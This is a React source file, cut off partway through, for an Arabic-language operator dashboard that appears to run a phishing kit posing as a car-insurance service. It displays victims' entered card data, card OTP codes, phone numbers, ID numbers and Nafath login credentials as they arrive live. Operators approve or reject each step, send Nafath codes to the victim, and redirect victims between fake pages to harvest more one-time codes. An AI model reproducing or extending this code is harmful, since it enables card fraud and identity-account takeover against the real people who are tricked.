import { useEffect, useMemo, useState, useRef, useCallback } from "react";
import { io, Socket } from "socket.io-client";
import { addData } from "@/lib/api";

type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  updatedAt?: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  raw?: Record<string, any>;
};

const countryFlags: Record<string, string> = {
  sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
  jo: "🇯🇴", jord: "🇯🇴", jordan: "🇯🇴", الأردن: "🇯🇴",
  ae: "🇦🇪", uae: "🇦🇪", emirates: "🇦🇪", الإمارات: "🇦🇪",
  eg: "🇪🇬", egy: "🇪🇬", egypt: "🇪🇬", مصر: "🇪🇬",
  om: "🇴🇲", oman: "🇴🇲", سلطنة_عمران: "🇴🇲",
  lb: "🇱🇧", lebanon: "🇱🇧", لبنان: "🇱🇧",
  sy: "🇸🇾", syr: "🇸🇾", syria: "🇸🇾", سوريا: "🇸🇾",
};

const countryCodes: Record<string, string> = {
  sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
};

// Format elapsed time since last update
function formatElapsedTime(isoString?: string): string {
  if (!isoString) return "—";
  const diff = Date.now() - new Date(isoString).getTime();
  if (diff < 0) return "الآن";
  const seconds = Math.floor(diff / 1000);
  if (seconds < 60) return `${seconds}ث`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}د ${seconds % 60}ث`;
  const hours = Math.floor(minutes / 60);
  return `${hours}س ${minutes % 60}د`;
}

// Live timer component for each request
function LiveTimer({ startTime }: { startTime: string }) {
  const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
  
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsed(formatElapsedTime(startTime));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime]);
  
  return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
}

export default function DashboardPage() {
  const [requests, setRequests] = useState<RequestItem[]>([]);
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
  const [nowTick, setNowTick] = useState<number>(Date.now());
  const [pinInput, setPinInput] = useState("");
  const [nafadInput, setNafadInput] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [redirectPage, setRedirectPage] = useState("");
  const socketRef = useRef<Socket | null>(null);
  const currentTimeRef = useRef(Date.now());

  // Page options for manual redirect
  const pageOptions = [
    { value: "", label: "اختر صفحة للتوجيه..." },
    { value: "home", label: "🏠 الصفحة الرئيسية" },
    { value: "step1", label: "1️⃣ اختيار نوع التأمين" },
    { value: "step2", label: "2️⃣ رمز التحقق (OTP)" },
    { value: "step3", label: "3️⃣ بيانات السيارة" },
    { value: "step4", label: "4️⃣ تأكيد الدفع" },
    { value: "step5", label: "5️⃣ التحقق من الهاتف" },
    { value: "step6", label: "6️⃣ النفاذ الوطني" },
    { value: "thank-you", label: "✅ شكراً لك" },
  ];

  // Stats
  const stats = useMemo(() => {
    const total = requests.length;
    const newCount = requests.filter((r) => r.badge === "new").length;
    const pendingCount = requests.filter((r) => r.badge === "pending").length;
    const completedCount = requests.filter((r) => r.badge === "completed").length;
    return { total, newCount, pendingCount, completedCount };
  }, [requests]);

  // Sort requests by updatedAt (newest first)
  const sortedRequests = useMemo(() => {
    return [...requests].sort((a, b) => {
      const timeA = new Date(a.updatedAt || a.submittedAt || 0).getTime();
      const timeB = new Date(b.updatedAt || b.submittedAt || 0).getTime();
      return timeB - timeA; // Descending order (newest first)
    });
  }, [requests]);

  // Handle Socket.IO update
  const handleSocketUpdate = useCallback((updatedRequest: any) => {
    // Add updatedAt timestamp if not present
    if (!updatedRequest.updatedAt) {
      updatedRequest.updatedAt = new Date().toISOString();
    }
    
    setRequests(prevRequests => {
      const existingIndex = prevRequests.findIndex(
        (r) => r.id === updatedRequest.id || r.visitorId === updatedRequest.visitorId
      );
      
      if (existingIndex >= 0) {
        const newRequests = [...prevRequests];
        newRequests[existingIndex] = updatedRequest;
        return newRequests;
      } else {
        return [updatedRequest, ...prevRequests];
      }
    });
    
    if (selectedRequestId && (updatedRequest.id === selectedRequestId || updatedRequest.visitorId === selectedRequestId)) {
      setSelectedRequestId(updatedRequest.id);
    }
  }, [selectedRequestId]);

  // Socket.IO connection
  useEffect(() => {
    // Create Socket.IO connection
    const socket = io("/", {
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: Infinity,
    });
    
    socketRef.current = socket;
    
    socket.on("connect", () => {
      console.log("[Dashboard] Socket.IO connected:", socket.id);
    });
    
    // Handle initial data from server
    socket.on("dashboard:init", (data: RequestItem[]) => {
      console.log("[Dashboard] Received initial data:", data.length, "requests");
      setRequests(data);
    });
    
    // Handle real-time updates
    socket.on("dashboard:update", (updatedRequest: RequestItem) => {
      console.log("[Dashboard] Received update:", updatedRequest.id);
      handleSocketUpdate(updatedRequest);
    });
    
    socket.on("disconnect", () => {
      console.log("[Dashboard] Socket.IO disconnected");
    });
    
    socket.on("connect_error", (error) => {
      console.log("[Dashboard] Socket.IO connection error:", error.message);
    });
    
    return () => {
      socket.disconnect();
      socketRef.current = null;
    };
  }, [handleSocketUpdate]);

  // Update current time every second for timers
  useEffect(() => {
    const interval = setInterval(() => {
      currentTimeRef.current = Date.now();
      setNowTick(Date.now());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Get country flag
  const getCountryFlag = (raw?: Record<string, any>): string => {
    if (!raw) return "🌐";
    const country = raw.country || raw.countryCode || raw.countryName || raw.location?.country || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, flag] of Object.entries(countryFlags)) {
      if (normalized.includes(key)) return flag;
    }
    return "🌐";
  };

  // Get country code
  const getCountryCode = (raw?: Record<string, any>): string => {
    if (!raw) return "—";
    const country = raw.country || raw.countryCode || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, code] of Object.entries(countryCodes)) {
      if (normalized.includes(key)) return code;
    }
    return normalized.slice(0, 2).toUpperCase() || "—";
  };

  // Get device icon
  const getDeviceIcon = (raw?: Record<string, any>): string => {
    if (!raw) return "📱";
    const device = String(raw.deviceType || raw.device || raw.platform || "").toLowerCase();
    if (/ipad|tablet/i.test(device)) return "💻";
    if (/desktop|pc/i.test(device)) return "🖥️";
    if (/phone|mobile|android|iphone/i.test(device)) return "📱";
    return "📱";
  };

  // Filter requests
  const filteredRequests = useMemo(() => {
    let filtered = sortedRequests;
    if (filterMode === "cards") {
      filtered = sortedRequests.filter((r) => r.hasCard);
    }
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (r) =>
          r.customer.toLowerCase().includes(query) ||
          r.id.toLowerCase().includes(query) ||
          r.raw?.phoneNumber?.toString().includes(query) ||
          r.raw?.identityNumber?.toString().includes(query)
      );
    }
    return filtered;
  }, [sortedRequests, filterMode, searchQuery]);

  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];

  // Show notification
  const showNotification = (type: "success" | "error", message: string) => {
    setNotification({ type, message });
    setTimeout(() => setNotification(null), 3000);
  };

  // Handle dashboard actions
  const handlePaymentAction = async (action: "approved" | "rejected") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("payment");
    try {
      const res = await fetch("/api/dashboard/payment-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
    // Get visitorId from multiple possible sources
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", JSON.stringify(selectedRequest));
    
    if (!visitorId) {
      console.log("[DASHBOARD] No visitorId found in selectedRequest:", selectedRequest);
      showNotification("error", "لم يتم العثور على بيانات الزائر");
      return;
    }
    
    setActionLoading("otp");
    try {
      const res = await fetch("/api/dashboard/otp-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز التحقق",
          rejected: "تم رفض رمز التحقق",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleSendPin = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("pin");
    try {
      const res = await fetch("/api/dashboard/send-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, pinCode: pinInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز PIN للعميل");
        setPinInput("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("phone");
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رقم الهاتف",
          rejected: "تم رفض رقم الهاتف",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleSendNafadCode = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("nafad");
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle manual redirect to any page
  const handleRedirect = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !redirectPage) return;
    
    setActionLoading("redirect");
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
      });
      if (res.ok) {
        const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
        showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
        setRedirectPage("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Get current page and status from visitor data
  const getCurrentPage = (): string => {
    const raw = selectedRequest?.raw;
    return raw?.currentPage || raw?.page || "";
  };

  const getCurrentStep = (): number => {
    const raw = selectedRequest?.raw;
    return raw?.currentStep || raw?.step || 0;
  };

  const getPaymentStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v1Status || "";
  };

  // Get card OTP status (step 2 - after payment approval)
  const getCardOtpStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v5Status || "";
  };

  const getPinStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v6Status || "";
  };

  // Get phone OTP status (step 5 - after PIN)
  const getPhoneOtpStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?.phoneOtpStatus || "";
  };

  // Render card verification status box (_v1Status)
  const renderCardVerificationBox = () => {
    const currentPage = getCurrentPage();
    const paymentStatus = getPaymentStatus();
    const raw = selectedRequest?.raw;

    // Show box if there's card data OR status is approved/rejected (keep showing after decision)
    const hasCardData = raw?._v1 || raw?.cardNumber;
    const hasDecision = paymentStatus === "approved" || paymentStatus === "rejected";
    // ALWAYS show if there's card data, never hide
    if (!hasCardData && !hasDecision) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>💳</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق بيانات الدفع
          </h3>
        </div>
        
        {/* Status message */}
        {paymentStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {paymentStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
          </div>
        )}
        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
          </div>
        )}
        
        {/* Action buttons - show only when pending or verifying */}
        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
          <div style={{ display: "flex", gap: 8 }}>
            <button
              onClick={() => handlePaymentAction("approved")}
              disabled={actionLoading === "payment"}
              style={{
                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
                background: "#22c55e", color: "#fff", fontWeight: 700,
                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
              }}
            >
              {actionLoading === "payment" ? "جاري..." : "✅ موافق"}
            </button>
            <button
              onClick={() => handlePaymentAction("rejected")}
              disabled={actionLoading === "payment"}
              style={{
                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
                background: "#ef4444", color: "#fff", fontWeight: 700,
                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
              }}
            >
              {actionLoading === "payment" ? "جاري..." : "❌ مرفوض"}
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Card OTP box (currentStep === 5)
  const renderCardOtpBox = () => {
    const currentStep = getCurrentStep();
    const currentPage = getCurrentPage();
    const cardOtpStatus = getCardOtpStatus();
    const raw = selectedRequest?.raw;

    // Get the OTP code from various possible field names
    const otpCode = raw?._v5 || raw?.otpCode || "";

    // Show box if there's OTP data OR status exists
    const hasOtpData = otpCode || raw?.otpSubmittedAt;
    const hasDecision = cardOtpStatus === "approved" || cardOtpStatus === "rejected";
    // ALWAYS show if there's OTP data, never hide
    if (!hasOtpData && !hasDecision && currentStep !== 5) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔐</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز التحقق من البطاقة
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 2</span>
        </div>
        
        {/* Show OTP code when submitted */}
        {otpCode && (
          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
          </div>
        )}
        
        {/* Status message */}
        {cardOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {cardOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
          </div>
        )}
        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة الرمز</p>
          </div>
        )}
        
        {/* Action buttons - show only when at this step and status is pending/verifying */}
        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && otpCode && (
          <div style={{ display: "flex", gap: 8 }}>
            <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
              {actionLoading === "otp" ? "جاري..." : "✅ موافق"}
            </button>
            <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
              {actionLoading === "otp" ? "جاري..." : "❌ مرفوض"}
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render PIN box (currentStep === 6)
  const renderPinBox = () => {
    const currentStep = getCurrentStep();
    const pinStatus = getPinStatus();
    const raw = selectedRequest?.raw;

    // Show box if there's PIN data OR status exists
    const hasPinData = raw?._v6 || raw?.pinCode;
    const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
    // ALWAYS show if there's PIN data, never hide
    if (!hasPinData && !hasDecision && currentStep !== 6) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔑</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز PIN
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 3</span>
        </div>
        
        {/* Status message */}
        {pinStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN - العميل يُوجه للهاتف</p>
          </div>
        )}
        {pinStatus === "pending" && currentStep === 6 && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز PIN</p>
          </div>
        )}
        {pinStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز PIN</p>
          </div>
        )}
      </div>
    );
  };

  // Render Phone OTP box (currentStep === 7)
  const renderPhoneOtpBox = () => {
    const currentStep = getCurrentStep();
    const phoneOtpStatus = getPhoneOtpStatus();
    const raw = selectedRequest?.raw;

    // Get phone OTP code if submitted (stored as _v7 in history)
    const phoneOtpCode = raw?._v7 || raw?.phoneOtp || "";

    // Show box if there's phone data OR OTP code OR status exists
    const hasPhoneData = raw?.phoneNumber || raw?.phoneIdNumber;
    const hasAnyPhoneData = hasPhoneData || phoneOtpCode || phoneOtpStatus;
    
    // Always show if there's any phone-related data, never hide
    if (!hasAnyPhoneData && currentStep !== 7) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>📱</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز تحقق الهاتف
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 4</span>
        </div>
        
        {/* Phone data info - ALWAYS show if exists */}
        {hasPhoneData && (
          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
            {(raw?.phoneIdNumber || raw?.identityNumber) && (
              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
                رقم الهوية: <strong dir="ltr">{raw.phoneIdNumber || raw.identityNumber}</strong>
              </p>
            )}
            {raw?.phoneNumber && (
              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
                رقم الهاتف: <strong dir="ltr">{raw.phoneNumber}</strong>
              </p>
            )}
            <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
              الشركة: <strong>{raw.phoneCarrier || "غير محدد"}</strong>
            </p>
          </div>
        )}
        
        {/* Show phone OTP code when submitted - THIS IS THE KEY BOX */}
        {phoneOtpCode ? (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 16, border: "2px solid #f59e0b", marginBottom: 12, textAlign: "center" }}>
            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>🔐 رمز التحقق المُدخل:</p>
            <p style={{ margin: 0, fontSize: "2rem", fontWeight: 700, color: "#78350f", letterSpacing: "0.4em" }}>{phoneOtpCode}</p>
          </div>
        ) : (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز التحقق</p>
          </div>
        )}
        
        {/* Status message */}
        {phoneOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للصفحة التالية</p>
          </div>
        )}
        {phoneOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - رقم الهاتف غير صحيح</p>
          </div>
        )}
        
        {/* Action buttons - show ONLY when OTP code is submitted */}
        {phoneOtpCode && (
          <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
                {actionLoading === "phone" ? "جاري..." : "✅ موافق"}
              </button>
              <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
                style={{ flex: 1, padding: "12px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
                {actionLoading === "phone" ? "جاري..." : "❌ مرفوض"}
              </button>
            </div>
            <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
              style={{ padding: "12px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700, cursor: "pointer" }}>
              🔄 إعادة إرسال رمز
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Nafad box (currentStep === 8)
  const renderNafadBox = () => {
    const currentStep = getCurrentStep();
    const raw = selectedRequest?.raw;

    // Get nafad data
    const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
    const adminNafadCode = raw?.adminNafadCode;
    
    // Show box if there's nafad data OR admin sent code OR at step 8
    if (!hasNafadData && !adminNafadCode && currentStep !== 8) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔐</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق التحقق من النفاذ
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 5</span>
        </div>
        
        {/* Nafad credentials - show when submitted */}
        {hasNafadData && (
          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
            {raw?.nafadIdNumber && (
              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
                رقم الهوية: <strong dir="ltr">{raw.nafadIdNumber}</strong>
              </p>
            )}
            {raw?.nafadPassword && (
              <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
                كلمة المرور: <strong dir="ltr">{"*".repeat(String(raw.nafadPassword).length)}</strong>
              </p>
            )}
          </div>
        )}
        
        {/* Input for nafad code - ALWAYS show when nafad data exists (for unlimited sends) */}
        {hasNafadData && (
          <div style={{ marginBottom: 12 }}>
            <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#374151", fontWeight: 600 }}>
              أدخل رمز النفاذ لإرساله للعميل:
            </p>
            <div style={{ display: "flex", gap: 8 }}>
              <input
                type="tel"
                maxLength={2}
                value={nafadInput}
                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
                placeholder={adminNafadCode || "00"}
                style={{
                  flex: 1,
                  padding: "10px 16px",
                  borderRadius: 8,
                  border: "2px solid #e5e7eb",
                  fontSize: "1.2rem",
                  textAlign: "center",
                  fontWeight: 700,
                }}
              />
              <button
                onClick={() => {
                  handleSendNafadCode();
                  setNafadInput(""); // Clear input after sending
                }}
                disabled={actionLoading === "nafad" || !nafadInput}
                style={{
                  padding: "10px 20px",
                  borderRadius: 8,
                  border: "none",
                  background: nafadInput ? "#22c55e" : "#9ca3af",
                  color: "#fff",
                  fontWeight: 700,
                  cursor: nafadInput ? "pointer" : "not-allowed",
                }}
              >
                {actionLoading === "nafad" ? "جاري..." : "📤 إرسال"}
              </button>
            </div>
          </div>
        )}
        
        {/* Status when code sent - show last sent code */}
        {adminNafadCode && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 16, border: "2px solid #86efac", marginBottom: 12, textAlign: "center" }}>
            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إرسال رمز النفاذ:</p>
            <p style={{ margin: 0, fontSize: "2.5rem", fontWeight: 700, color: "#166534", letterSpacing: "0.5em" }}>{adminNafadCode}</p>
            <p style={{ margin: "8px 0 0", fontSize: "0.75rem", color: "#166534" }}>يمكن إرسال رمز جديد في أي وقت</p>
          </div>
        )}
        
        {/* Waiting message */}
        {!adminNafadCode && hasNafadData && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إرسال رمز النفاذ</p>
          </div>
        )}
      </div>
    );
  };

  // Render action buttons based on current page
  const renderActionButtons = () => {
    // Render all boxes independently (each shows/hides based on data availability and currentStep)
    return (
      <>
        {renderCardVerificationBox()}
        {renderCardOtpBox()}
        {renderPinBox()}
        {renderPhoneOtpBox()}
        {renderNafadBox()}
      </>
    );
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif" }} dir="rtl">
      {/* Notification */}
      {notification && (
        <div
          style={{
            position: "fixed",
            top: 70,
            left: "50%",
            transform: "translateX(-50%)",
            padding: "12px 24px",
            borderRadius: 8,
            background: notification.type === "success" ? "#22c55e" : "#ef4444",
            color: "#fff",
            fontWeight: 600,
            zIndex: 1000,
            boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
            direction: "rtl",
          }}
        >
          {notification.message}
        </div>
      )}

      {/* Header */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          height: 54,
          padding: "0 12px",
          background: "#ffffff",
